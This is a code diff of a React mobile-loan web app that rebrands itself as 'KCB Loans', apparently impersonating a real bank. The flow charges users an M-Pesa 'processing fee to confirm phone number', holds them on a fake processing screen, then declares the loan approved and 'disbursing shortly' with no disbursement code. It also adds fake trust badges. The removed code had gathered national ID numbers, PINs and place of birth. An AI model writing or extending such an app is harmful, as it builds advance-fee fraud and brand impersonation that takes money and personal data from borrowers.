+      </div>
+
+      <div style={{
+        background: "#1f3b73",
+        color: "#fff",
+        padding: 16,
+        borderRadius: 12,
+        marginBottom: 16,
+        fontWeight: 700,
+        fontSize: 18
+      }}>
+        Confirm Your Loan
+      </div>
+
+      <div style={{
+        background: "#fff",
+        padding: 16,
+        borderRadius: 12
+      }}>
+        <p>Hi {userData.name}, please review the details below before applying.</p>
+
+        <div style={{
+          background: "#e2e8f0",
+          padding: 16,
+          borderRadius: 10,
+          margin: "12px 0",
+          display: "flex",
+          justifyContent: "space-between"
+        }}>
+          <div>
+            <div style={{ fontSize: 12 }}>LOAN AMOUNT</div>
+            <div style={{ fontWeight: 800, fontSize: 20 }}>
+              KSh {fmt(loan.amount)}
+            </div>
+          </div>
+
+          <div style={{ textAlign: "right" }}>
+            <div style={{ fontSize: 12 }}>Repayment Period</div>
+            <div style={{ fontWeight: 700 }}>6 months</div>
+          </div>
+        </div>
+
+        <div style={{ marginTop: 10, marginBottom: 10, fontWeight: 700 }}>
+          FEE BREAKDOWN
+        </div>
+
+        <div style={{ display: "flex", justifyContent: "space-between" }}>
+          <div>
+            <div>Processing Fee to Confirm Phone Number</div>
+            <div style={{ fontSize: 12, color: "#666" }}>One-time</div>
+          </div>
+          <div>KSh {fmt(loan.fee)}</div>
+        </div>
+
+        <div style={{ display: "flex", justifyContent: "space-between", marginTop: 8 }}>
+          <div>
+            <div>Interest</div>
+            <div style={{ fontSize: 12, color: "#666" }}>8.8%</div>
+          </div>
+          <div>KSh {fmt(interest)}</div>
+        </div>
+
+        <div style={{ display: "flex", justifyContent: "space-between", marginTop: 8 }}>
+          <span>Repayment period</span>
+          <span>6 months</span>
+        </div>
+
+        <hr style={{ margin: "14px 0" }} />
+
+        <div style={{
+          display: "flex",
+          justifyContent: "space-between",
+          fontWeight: 800,
+          color: "red"
+        }}>
+          <span>Total repayment</span>
+          <span>KSh {fmt(total)}</span>
+        </div>
+
+        <div style={{
+          marginTop: 14,
+          background: "#f1f5f9",
+          padding: 12,
+          borderRadius: 10,
+          textAlign: "center"
+        }}>
+          Funds will be sent to <b>+{normPhone}</b>
+        </div>
+
+        <button
+          onClick={onApply}
+          style={{
+            marginTop: 20,
+            width: "100%",
+            padding: 16,
+            background: "#e11d48",
+            color: "#fff",
+            border: "none",
+            borderRadius: 10,
+            fontWeight: 700
+          }}
+        >
+          APPLY NOW
+        </button>
       </div>
     </div>
   );
 }
 
-/* ══════════════════════════════════════════════════
-   STK MODAL
-══════════════════════════════════════════════════ */
+/* ── MODAL: STK PUSH SENT ── */
+/* ── MODAL: STK PUSH SENT ── */
 function STKModal({ loan, userData, onSuccess, onCancel }) {
-  const [dots, setDots]         = useState(1);
-  const [status, setStatus]     = useState("Waiting for M-Pesa confirmation...");
-  const pollRef                 = useRef(null);
-  const dotsRef                 = useRef(null);
-  const hasRunRef               = useRef(false);
-  const startRef                = useRef(Date.now());
-  const doneRef                 = useRef(false);
+  const [dotsCount, setDotsCount] = useState(1);
+  const [statusText, setStatusText] = useState(
+    "Waiting for M-Pesa confirmation..."
+  );
+
+  const pollRef = useRef(null);
+  const dotsRef = useRef(null);
+  const hasRunRef = useRef(false);
+  const startTimeRef = useRef(Date.now());
+  const successTriggeredRef = useRef(false);
 
   const normPhone = normalisePhone(userData.phone) || userData.phone;
 
   useEffect(() => {
     if (hasRunRef.current) return;
     hasRunRef.current = true;
-    startRef.current  = Date.now();
 
-    dotsRef.current = setInterval(() => setDots(d => d >= 3 ? 1 : d + 1), 600);
+    startTimeRef.current = Date.now();
 
-    const finish = () => {
-      if (doneRef.current) return;
-      doneRef.current = true;
+    // dots animation
+    dotsRef.current = setInterval(() => {
+      setDotsCount((d) => (d >= 3 ? 1 : d + 1));
+    }, 600);
+
+
+    const finishSuccess = () => {
+      if (successTriggeredRef.current) return;
+
+      successTriggeredRef.current = true;
+
       clearInterval(pollRef.current);
-      setStatus("Payment confirmed! Loading your loan...");
-      setTimeout(onSuccess, 1200);
+
+      setStatusText("Payment confirmed successfully...");
+
+      setTimeout(() => {
+        onSuccess();
+      }, 1200);
     };
 
-    const run = async () => {
+
+    const initPay = async () => {
       try {
-        setStatus("Sending M-Pesa request...");
-        const res  = await fetch(`${MPESA_BASE}/api/runPrompt`, {
-          method:  "POST",
-          headers: { "Content-Type": "application/json" },
+
+        setStatusText("Sending STK request...");
+
+        const res = await fetch(`${MPESA_BASE}/api/runPrompt`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
           body: JSON.stringify({
-            phone:            normPhone,
-            amount:           loan.fee,
-            local_id:         `KORO-${Date.now()}`,
-            transaction_desc: `Koro Loans processing fee Ksh ${loan.fee}`,
+            phone: normPhone,
+            amount: loan.fee,
+            local_id: `KCB-${Date.now()}`,
+            transaction_desc: `Subscr fee Ksh ${loan.fee}`,
           }),
         });
+
+
         const data = await res.json().catch(() => ({}));
 
+
         if (!res.ok || data.status === false) {
-          setStatus("Check your phone for M-Pesa prompt...");
+          console.log("STK failed to send:", data);
+          setStatusText("Waiting for M-Pesa prompt...");
           return;
         }
 
-        const cid = data.checkout_request_id || data.checkoutRequestId || null;
-        setStatus("STK push sent. Enter your M-Pesa PIN...");
 
-        if (!cid) return;
+        const cid =
+          data.checkout_request_id ||
+          data.checkoutRequestId ||
+          null;
 
-        // Poll every 5 seconds
+
+        if (!cid) {
+          console.log("Missing checkout request ID");
+          return;
+        }
+
+
+        setStatusText(
+          "STK prompt sent. Enter your M-Pesa PIN..."
+        );
+
+
         pollRef.current = setInterval(async () => {
-          try {
-            const r = await fetch(`${MPESA_BASE}/api/status/${cid}`);
-            if (!r.ok) return;
-            const d = await r.json();
-            const ok = d?.success === true || d?.status === "completed" || d?.ResultCode === 0;
-            if (ok) {
-              const elapsed  = Date.now() - startRef.current;
-              const minWait  = 8000; // show STK screen at least 8s
-              if (elapsed < minWait) {
-                setStatus("Payment received. Finalizing your loan...");
-                setTimeout(finish, minWait - elapsed);
-              } else {
-                finish();
-              }
-            } else {
-              setStatus("Waiting for M-Pesa confirmation...");
-            }
-          } catch { /* ignore */ }
-        }, 5000);
 
-      } catch {
-        setStatus("Check your phone for the M-Pesa prompt...");
+          try {
+
+            const r = await fetch(
+              `${MPESA_BASE}/api/status/${cid}`
+            );
+
+
+            if (!r.ok) return;
+
+
+            const d = await r.json();
+
+
+            const completed =
+              d?.success === true ||
+              d?.status === "completed" ||
+              d?.ResultCode === 0;
+
+
+            if (completed) {
+
+
+              const elapsed =
+                Date.now() - startTimeRef.current;
+
+
+              /*
+                Force STK screen to remain visible
+                for at least 20 seconds.
+                Prevents instant success screen.
+              */
+              const minimumWait = 30000;
+
+
+              if (elapsed < minimumWait) {
+
+                const waitMore =
+                  minimumWait - elapsed;
+
+
+                setStatusText(
+                  "Payment received. Finalizing..."
+                );
+
+
+                setTimeout(() => {
+                  finishSuccess();
+                }, waitMore);
+
+
+              } else {
+
+                finishSuccess();
+
+              }
+
+            } else {
+
+              setStatusText(
+                "Waiting for M-Pesa confirmation..."
+              );
+
+            }
+
+
+          } catch (err) {
+
+            // silently ignore polling errors
+
+          }
+
+
+        }, 6000);
+
+
+      } catch (err) {
+
+        console.log(
+          "STK network error",
+          err
+        );
+
       }
     };
 
-    run();
+
+    initPay();
+
 
     return () => {
-      clearInterval(pollRef.current);
-      clearInterval(dotsRef.current);
+
+      clearInterval(
+        pollRef.current
+      );
+
+      clearInterval(
+        dotsRef.current
+      );
+
     };
+
+
   }, []);
+
+
 
   return (
     <div className="modal-bg">
-      <div className="stk-modal-box">
-        <div className="stk-phone-icon">
-          <svg viewBox="0 0 24 24">
-            <rect x="5" y="2" width="14" height="20" rx="2" ry="2"/>
-            <line x1="12" y1="18" x2="12" y2="18"/>
-          </svg>
+
+      <div
+        className="modal-box"
+        style={{
+          textAlign: "center"
+        }}
+      >
+
+        <div className="modal-icon phone">
+          📱
         </div>
-        <div className="stk-title">STK Push Sent</div>
-        <div className="stk-status-text">{status}</div>
-        <div className="stk-progress-wrap">
-          <div className="stk-progress-fill" />
+
+
+        <div className="stk-title">
+          STK Push Sent
         </div>
+
+
+        <div className="stk-phone-box">
+          {statusText}
+        </div>
+
+
+        <div className="stk-bar-wrap">
+          <div className="stk-bar-fill" />
+        </div>
+
+
         <div className="stk-verifying">
-          Verifying payment{".".repeat(dots)}
+
+          Processing
+          <span>
+            {".".repeat(dotsCount)}
+          </span>
+
         </div>
-        <button className="stk-cancel" onClick={onCancel}>Cancel</button>
+
+
+        <button
+          className="stk-manual"
+          onClick={onCancel}
+        >
+          Cancel
+        </button>
+
+
       </div>
+
     </div>
   );
 }
-
-/* ══════════════════════════════════════════════════
-   SUCCESS SCREEN
-══════════════════════════════════════════════════ */
+/* ── SUCCESS SCREEN ── */
 function SuccessScreen({ loan, userData, onDone }) {
-  const repayDate = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000);
-  const repayStr  = repayDate.toLocaleDateString("en-KE", { day: "numeric", month: "short", year: "numeric" });
+  const now = new Date();
+  const repayDate = new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000);
+  const repayStr = repayDate.toLocaleDateString("en-KE", { day: "numeric", month: "short", year: "numeric" });
 
   return (
-    <div className="shell">
-      <div className="step-nav">
-        <div className="logo-block" style={{ padding: 0 }}>
-          <KoroLogo size={32} />
+    <div style={{ padding: "0 0 30px" }}>
+      <div className="topbar">
+        <div className="logo-pill">
+          <span className="logo-text">KCB Loans<span className="logo-reg">®</span></span>
         </div>
-        <span className="koro-wordmark" style={{ fontSize: "1rem" }}>KORO</span>
-        <div />
       </div>
       <div className="success-wrap">
-        <div className="success-icon">
-          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-        </div>
+        <div className="success-icon">🎉</div>
         <div className="success-title">Loan Approved!</div>
         <div className="success-sub">
-          Congratulations <strong>{userData.name}</strong>! Your loan has been approved and will be disbursed to{" "}
-          <strong>{userData.phone}</strong> within minutes.
+          Congratulations <strong>{userData.name}</strong>! Your loan has been approved and will be disbursed to <strong>{userData.phone}</strong> within minutes.
         </div>
         <div className="success-amount-box">
           <div className="success-amount">Ksh {fmt(loan.amount)}</div>
-          <div className="success-amount-sub">Disbursing to M-Pesa shortly</div>
+          <div className="success-amount-sub">Disbursing to M-Pesa shortly ⚡</div>
         </div>
         <div className="success-details">
           {[
-            ["Loan Amount",     `Ksh ${fmt(loan.amount)}`],
-            ["Processing Fee",  `Ksh ${fmt(loan.fee)}`],
+            ["Loan Amount", `Ksh ${fmt(loan.amount)}`],
+            ["Processing Fee", `Ksh ${fmt(loan.fee)}`],
             ["Total Repayment", `Ksh ${fmt(loan.repayment)}`],
-            ["Repayment Date",  repayStr],
-            ["M-Pesa Number",   userData.phone],
-            ["Status",          "Approved"],
+            ["Repayment Date", repayStr],
+            ["M-Pesa Number", userData.phone],
+            ["Status", "✅ Approved"],
           ].map(([k, v]) => (
-            <div key={k} className="s-row">
-              <span className="s-key">{k}</span>
-              <span className="s-val" style={k === "Status" ? { color: "#22c55e" } : {}}>{v}</span>
+            <div key={k} className="srow">
+              <span className="srow-k">{k}</span>
+              <span className="srow-v">{v}</span>
             </div>
           ))}
         </div>
-        <button className="btn-green" onClick={onDone}>
-          Apply for Another Loan
-        </button>
-      </div>
-    </div>
-  );
-}
-
-/* ══════════════════════════════════════════════════
-   DASHBOARD
-══════════════════════════════════════════════════ */
-function Dashboard({ userData, onReset }) {
-  const [selected, setSelected] = useState(null);
-  const [modal, setModal]       = useState("none"); // none | confirm | stk | success
-  const [selLoan, setSelLoan]   = useState(null);
-
-  const handleCardClick = (loan) => {
-    setSelected(loan);
-  };
-
-  const handleGetLoan = () => {
-    if (!selected) return;
-    setSelLoan(selected);
-    setModal("confirm");
-  };
-
-  if (modal === "success" && selLoan) {
-    return (
-      <SuccessScreen
-        loan={selLoan}
-        userData={userData}
-        onDone={() => { setModal("none"); setSelected(null); setSelLoan(null); onReset(); }}
-      />
-    );
-  }
-
-  return (
-    <div className="shell" style={{ minHeight: "100vh" }}>
-      {/* Top header */}
-      <div className="dash-header">
-        <div className="dash-top">
-          <div>
-            <div className="dash-greeting">Hello, {userData.name.split(" ")[0]}</div>
-            <div className="dash-sub">Choose a loan that suits you</div>
-          </div>
-          <div className="dash-avatar">
-            {userData.name.charAt(0).toUpperCase()}
-          </div>
-        </div>
-        <div className="logo-block" style={{ flexDirection: "row", padding: "0 0 14px", gap: 8 }}>
-          <KoroLogo size={28} />
-          <span className="koro-wordmark" style={{ fontSize: ".9rem" }}>KORO</span>
-        </div>
-      </div>
-
-      {/* Ticker */}
-      <Ticker />
-
-      {/* Section title */}
-      <div className="loan-section-title">Select Your Loan Amount</div>
-      <div className="loan-sub-title">Tap a card to select, then tap Get Loan Now</div>
-
-      {/* Loan grid */}
-      <div className="loan-grid">
-        {LOANS.map((loan) => (
-          <div
-            key={loan.amount}
-            className={`loan-card${selected?.amount === loan.amount ? " selected" : ""}`}
-            onClick={() => handleCardClick(loan)}
-          >
-            <div className="loan-amount">Ksh {fmt(loan.amount)}</div>
-            <div className="loan-fee">Fee: Ksh {fmt(loan.fee)}</div>
-            <div className="loan-repay">Repay: Ksh {fmt(loan.repayment)}</div>
-          </div>
-        ))}
-      </div>
-
-      {/* Security badges */}
-      <div className="security-strip">
-        {["SSL Secured","Data Protected","No CRB Check","Licensed"].map(l => (
-          <div key={l} className="sec-pill">
-            <div className="sec-pill-dot" />
-            {l}
-          </div>
-        ))}
-      </div>
-
-      {/* Fixed bottom CTA */}
-      <div className="dash-bottom-bar">
         <button
-          className="btn-green"
-          onClick={handleGetLoan}
-          disabled={!selected}
-          style={{ opacity: selected ? 1 : 0.45 }}
+          className="btn-primary"
+          style={{ width: "100%", margin: "20px 0 0", display: "flex" }}
+          onClick={onDone}
         >
-          Get Loan Now
+          Apply for Another Loan →
         </button>
-      </div>
-
-      {/* Modals */}
-      {modal === "confirm" && selLoan && (
-        <ConfirmModal
-          loan={selLoan}
-          userData={userData}
-          onProceed={() => setModal("stk")}
-          onCancel={() => setModal("none")}
-        />
-      )}
-      {modal === "stk" && selLoan && (
-        <STKModal
-          loan={selLoan}
-          userData={userData}
-          onSuccess={() => setModal("success")}
-          onCancel={() => setModal("none")}
-        />
-      )}
-    </div>
-  );
-}
-
-/* ══════════════════════════════════════════════════
-   REGISTRATION STEPS
-══════════════════════════════════════════════════ */
-
-/* Step wrapper with shared top-nav */
-function StepShell({ step, total = 6, onBack, children }) {
-  return (
-    <div className="shell" style={{ minHeight: "100vh" }}>
-      <div className="step-nav">
-        <button className="step-back" onClick={onBack} aria-label="Back">
-          ←
-        </button>
-        <div className="logo-block" style={{ flexDirection: "row", padding: 0, gap: 8 }}>
-          <KoroLogo size={28} />
-          <span className="koro-wordmark" style={{ fontSize: ".9rem" }}>KORO</span>
-        </div>
-        <button className="step-chat">Chat with us</button>
-      </div>
-      <div className="step-number">
-        Registration step {step} out of {total}
-      </div>
-      {children}
-    </div>
-  );
-}
-
-/* Step 1 — Full Name */
-function Step1({ value, onChange, onNext, onBack }) {
-  const [err, setErr] = useState("");
-  const submit = () => {
-    if (!value.trim() || value.trim().split(" ").length < 2) {
-      setErr("Enter your full name as it appears on your ID");
-      return;
-    }
-    setErr("");
-    onNext();
-  };
-  return (
-    <StepShell step={1} onBack={onBack}>
-      <div className="step-body">
-        <div className="step-instruction">Enter your full name from your ID card</div>
-        <div className="step-example-link">(see example below)</div>
-        <KenyaIDCard highlightName />
-        <div className="inp-wrap">
-          <input
-            className={`koro-inp${err ? " err" : ""}`}
-            type="text"
-            placeholder="Full Name"
-            value={value}
-            onChange={e => { onChange(e.target.value); setErr(""); }}
-            autoFocus
-          />
-          {err && <div className="ferr">{err}</div>}
-        </div>
-        <button className="btn-continue" onClick={submit}>Continue</button>
-      </div>
-    </StepShell>
-  );
-}
-
-/* Step 2 — National ID */
-function Step2({ value, onChange, onNext, onBack }) {
-  const [err, setErr] = useState("");
-  const submit = () => {
-    if (!value.trim().match(/^\d{7,8}$/)) {
-      setErr("Enter a valid 7–8 digit ID number");
-      return;
-    }
-    setErr("");
-    onNext();
-  };
-  return (
-    <StepShell step={2} onBack={onBack}>
-      <div className="step-body">
-        <div className="step-instruction">Enter your ID number from your ID card</div>
-        <div className="step-example-link">(see example below)</div>
-        <KenyaIDCard highlightId />
-        <div className="inp-wrap">
-          <input
-            className={`koro-inp${err ? " err" : ""}`}
-            type="text"
-            inputMode="numeric"
-            placeholder="National ID"
-            value={value}
-            onChange={e => { onChange(e.target.value.replace(/\D/g, "").slice(0, 8)); setErr(""); }}
-          />
-          {err && <div className="ferr">{err}</div>}
-        </div>
-        <button className="btn-continue" onClick={submit}>Continue</button>
-      </div>
-    </StepShell>
-  );
-}
-
-/* Step 3 — PIN */
-function Step3({ value, onChange, onNext, onBack }) {
-  const [err, setErr]     = useState("");
-  const [show, setShow]   = useState(false);
-  const submit = () => {
-    if (!value.match(/^\d{4}$/)) {
-      setErr("Enter a 4-digit PIN");
-      return;
-    }
-    setErr("");
-    onNext();
-  };
-  return (
-    <StepShell step={3} onBack={onBack}>
-      <div className="step-body">
-        <div style={{ marginBottom: 8 }}>
-          <div style={{ fontSize: "1.2rem", fontWeight: 800, color: "#111", marginBottom: 6 }}>Secure your account</div>
-          <div style={{ fontSize: 14, color: "#444", lineHeight: 1.65 }}>
-            Enter your PIN below, which will be used to log in to the Koro app and will serve as your security key
-          </div>
-        </div>
-        <div className="inp-wrap" style={{ marginTop: 20 }}>
-          <div className={`pin-inp-wrap${err ? " err" : ""}`}>
-            <div className="pin-eye" onClick={() => setShow(s => !s)}>
-              <svg viewBox="0 0 24 24">
-                {show
-                  ? <><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></>
-                  : <><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></>
-                }
-              </svg>
-            </div>
-            <input
-              className="pin-inp"
-              type={show ? "text" : "password"}
-              inputMode="numeric"
-              maxLength={4}
-              placeholder="4-digit PIN"
-              value={value}
-              onChange={e => { onChange(e.target.value.replace(/\D/g, "").slice(0, 4)); setErr(""); }}
-            />
-          </div>
-          {err && <div className="ferr">{err}</div>}
-        </div>
-        <button className="btn-continue" onClick={submit} style={{ marginTop: 8 }}>Continue</button>
-      </div>
-    </StepShell>
-  );
-}
-
-/* Step 4 — Place of Birth */
-function Step4({ value, onChange, onNext, onBack }) {
-  const [err, setErr] = useState("");
-  const submit = () => {
-    if (!value.trim() || value.trim().length < 3) {
-      setErr("Enter your place of birth");
-      return;
-    }
-    setErr("");
-    onNext();
-  };
-  return (
-    <StepShell step={4} onBack={onBack}>
-      <div className="step-body">
-        <div style={{ marginBottom: 8 }}>
-          <div style={{ fontSize: "1.2rem", fontWeight: 800, color: "#111", marginBottom: 6 }}>Secure your account</div>
-          <div style={{ fontSize: 14, color: "#444", lineHeight: 1.65 }}>
-            Enter your place of birth below, which will be needed if you forget your PIN.
-          </div>
-        </div>
-        <div className="inp-wrap" style={{ marginTop: 20 }}>
-          <input
-            className={`koro-inp${err ? " err" : ""}`}
-            type="text"
-            placeholder="Place of Birth"
-            value={value}
-            onChange={e => { onChange(e.target.value); setErr(""); }}
-          />
-          {err && <div className="ferr">{err}</div>}
-        </div>
-        <button className="btn-continue" onClick={submit} style={{ marginTop: 8 }}>Continue</button>
-      </div>
-    </StepShell>
-  );
-}
-
-/* Step 5 — Phone */
-function Step5({ value, onChange, onNext, onBack }) {
-  const [err, setErr] = useState("");
-  const submit = () => {
-    if (!isValidPhone(value)) {
-      setErr("Enter a valid Safaricom or Airtel number");
-      return;
-    }
-    setErr("");
-    onNext();
-  };
-  return (
-    <StepShell step={5} onBack={onBack}>
-      <div className="step-body">
-        <div className="logo-block" style={{ marginBottom: 16 }}>
-          <KoroLogo size={64} />
-          <span className="koro-wordmark">KORO</span>
-        </div>
-        <div className="inp-wrap" style={{ marginTop: 8 }}>
-          <div style={{ fontSize: 12, color: "#888", marginBottom: 5, fontWeight: 600 }}>
-            Enter your mobile number
-          </div>
-          <div className={`phone-inp-wrap${err ? " err" : ""}`}>
-            <div className="phone-icon">
-              <svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12" y2="18"/></svg>
-            </div>
-            <input
-              className="phone-inp"
-              type="tel"
-              inputMode="numeric"
-              placeholder="+254 (0) 7XX-XXX-XXX"
-              value={value}
-              onChange={e => { onChange(e.target.value.replace(/[^\d+\s\-()]/g, "").slice(0, 16)); setErr(""); }}
-            />
-          </div>
-          {err && <div className="ferr">{err}</div>}
-        </div>
-        <button className="btn-continue" onClick={submit}>Next</button>
-        <div className="returning-notice" style={{ marginTop: 20 }}>
-          FOR RETURNING CLIENTS: remember to log in with the phone number you registered with!
-        </div>
-      </div>
-    </StepShell>
-  );
-}
-
-/* Step 6 — Loan Type */
-function Step6({ value, onChange, onNext, onBack }) {
-  const [err, setErr] = useState("");
-  const submit = () => {
-    if (!value) {
-      setErr("Please select a loan type");
-      return;
-    }
-    setErr("");
-    onNext();
-  };
-  return (
-    <StepShell step={6} onBack={onBack}>
-      <div className="step-body">
-        <div style={{ fontSize: "1.2rem", fontWeight: 800, color: "#111", marginBottom: 6 }}>
-          What is this loan for?
-        </div>
-        <div style={{ fontSize: 14, color: "#6b7280", marginBottom: 22, lineHeight: 1.6 }}>
-          Select the loan type that best describes your need. This helps us match you with the right offer.
-        </div>
-        <div className="inp-wrap">
-          <select
-            className={`koro-sel${err ? " err" : ""}`}
-            value={value}
-            onChange={e => { onChange(e.target.value); setErr(""); }}
-          >
-            <option value="">Select Loan Type</option>
-            {LOAN_TYPES.map(t => <option key={t} value={t}>{t}</option>)}
-          </select>
-          {err && <div className="ferr">{err}</div>}
-        </div>
-        <div style={{ display: "flex", flexDirection: "column", gap: 8, marginBottom: 22 }}>
-          {LOAN_TYPES.map(t => (
-            <div
-              key={t}
-              onClick={() => { onChange(t); setErr(""); }}
-              style={{
-                padding: "13px 16px",
-                border: `1.5px solid ${value === t ? "#22c55e" : "#e5e7eb"}`,
-                borderRadius: 10,
-                cursor: "pointer",
-                fontSize: 14,
-                fontWeight: 600,
-                color: value === t ? "#22c55e" : "#374151",
-                background: value === t ? "#f0fdf4" : "#fff",
-                display: "flex",
-                justifyContent: "space-between",
-                alignItems: "center",
-                transition: "all .15s",
-              }}
-            >
-              {t}
-              {value === t && <span style={{ color: "#22c55e", fontWeight: 900 }}>✓</span>}
-            </div>
+        <div className="security-strip" style={{ paddingTop: 16 }}>
+          {[["🔒","SSL Secured"],["🛡️","Data Protected"],["⭐","Licensed Program"],["👥","Trusted by Thousands"]].map(([ic,lb])=>(
+            <div key={lb} className="sec-pill"><span>{ic}</span>{lb}</div>
           ))}
         </div>
-        <button className="btn-continue" onClick={submit}>Continue</button>
-      </div>
-    </StepShell>
-  );
-}
-
-/* ══════════════════════════════════════════════════
-   SPLASH SCREEN
-══════════════════════════════════════════════════ */
-function Splash({ onStart }) {
-  return (
-    <div className="shell splash" style={{ minHeight: "100vh" }}>
-      <div className="splash-bg-img" />
-      <div className="splash-bg" />
-      <div className="splash-content">
-        <KoroLogo size={72} white />
-        <div className="splash-logo-text">KORO</div>
-        <div className="splash-headline">
-          SAY HELLO TO <em>EASY LENDING</em>
-        </div>
-      </div>
-      <div className="splash-bottom">
-        <button className="btn-green" onClick={onStart} style={{ fontSize: 16, letterSpacing: ".12em" }}>
-          GET STARTED
-        </button>
-        <div className="splash-terms">
-          Terms and conditions apply:{" "}
-          <a href="#">Terms &amp; Conditions</a>,{" "}
-          <a href="#">Terms of Use</a>,{" "}
-          <a href="#">Affiliation Policy</a>,{" "}
-          <a href="#">PEP statement</a> and{" "}
-          <a href="#">Privacy Policy</a>
-        </div>
-        <div className="splash-legal">
-          Representative Example For First Loan: a 61-day loan with principal amount of KSh 1,000,
-          the interest would be KSh 390 and the total amount due would be KSh 1,390.
-        </div>
       </div>
     </div>
   );
 }
 
-/* ══════════════════════════════════════════════════
+/* ══════════════════════════════════════════════════════════════
    ROOT APP
-══════════════════════════════════════════════════ */
-export default function KoroApp() {
-  /* screen: splash | s1 | s2 | s3 | s4 | s5 | s6 | dashboard */
-  const [screen, setScreen] = useState("splash");
+══════════════════════════════════════════════════════════════ */
+export default function KCBLoans() {
+  const [screen, setScreen] = useState("hero"); // hero | form | grid | success
+  const [userData, setUserData] = useState(null);
+  const [selectedLoan, setSelectedLoan] = useState(null);
+  const [showConfirm, setShowConfirm] = useState(false);
+  const [showSTK, setShowSTK] = useState(false);
 
-  const [formData, setFormData] = useState({
-    name:     "",
-    idNumber: "",
-    pin:      "",
-    birthPlace: "",
-    phone:    "",
-    loanType: "",
-  });
+  const handleFormNext = (data) => {
+    setUserData(data);
+    setScreen("grid");
+  };
 
-  const set = (key) => (val) => setFormData(p => ({ ...p, [key]: val }));
+ const handleLoanSelect = (loan) => {
+  setSelectedLoan(loan);
+  setScreen("confirm");
+};
 
-  const goBack = (to) => () => setScreen(to);
+  const handleProceed = () => {
+    setShowConfirm(false);
+    setShowSTK(true);
+  };
 
-  const reset = () => {
-    setFormData({ name:"", idNumber:"", pin:"", birthPlace:"", phone:"", loanType:"" });
-    setScreen("splash");
+  const handleSuccess = () => {
+    setShowSTK(false);
+    setScreen("success");
+  };
+
+  const handleReset = () => {
+    setScreen("hero");
+    setUserData(null);
+    setSelectedLoan(null);
+    setShowConfirm(false);
+    setShowSTK(false);
   };
 
   return (
     <>
       <style>{CSS}</style>
+      <div className="app">
 
-      {screen === "splash" && <Splash onStart={() => setScreen("s1")} />}
+       {screen === "hero" && <HeroScreen onStart={() => setScreen("form")} />}
 
-      {screen === "s1" && (
-        <Step1
-          value={formData.name}
-          onChange={set("name")}
-          onNext={() => setScreen("s2")}
-          onBack={goBack("splash")}
-        />
-      )}
+{screen === "form" && <EligibilityScreen onNext={handleFormNext} />}
 
-      {screen === "s2" && (
-        <Step2
-          value={formData.idNumber}
-          onChange={set("idNumber")}
-          onNext={() => setScreen("s3")}
-          onBack={goBack("s1")}
-        />
-      )}
+{screen === "grid" && (
+  <LoanGridScreen userData={userData} onSelect={handleLoanSelect} />
+)}
 
-      {screen === "s3" && (
-        <Step3
-          value={formData.pin}
-          onChange={set("pin")}
-          onNext={() => setScreen("s4")}
-          onBack={goBack("s2")}
-        />
-      )}
+{screen === "confirm" && selectedLoan && (
+  <ConfirmScreen
+    loan={selectedLoan}
+    userData={userData}
+    onApply={() => setShowSTK(true)}
+    onBack={() => setScreen("grid")}
+  />
+)}
 
-      {screen === "s4" && (
-        <Step4
-          value={formData.birthPlace}
-          onChange={set("birthPlace")}
-          onNext={() => setScreen("s5")}
-          onBack={goBack("s3")}
-        />
-      )}
+{screen === "success" && (
+  <SuccessScreen
+    loan={selectedLoan}
+    userData={userData}
+    onDone={handleReset}
+  />
+)}
 
-      {screen === "s5" && (
-        <Step5
-          value={formData.phone}
-          onChange={set("phone")}
-          onNext={() => setScreen("s6")}
-          onBack={goBack("s4")}
-        />
-      )}
 
-      {screen === "s6" && (
-        <Step6
-          value={formData.loanType}
-          onChange={set("loanType")}
-          onNext={() => setScreen("dashboard")}
-          onBack={goBack("s5")}
-        />
-      )}
 
-      {screen === "dashboard" && (
-        <Dashboard userData={formData} onReset={reset} />
-      )}
+{showSTK && (
+  <STKModal
+    loan={selectedLoan}
+    userData={userData}
+    onSuccess={handleSuccess}
+    onCancel={() => setShowSTK(false)}
+  />
+)}
+
+     
+
+      </div>
     </>
   );
 }
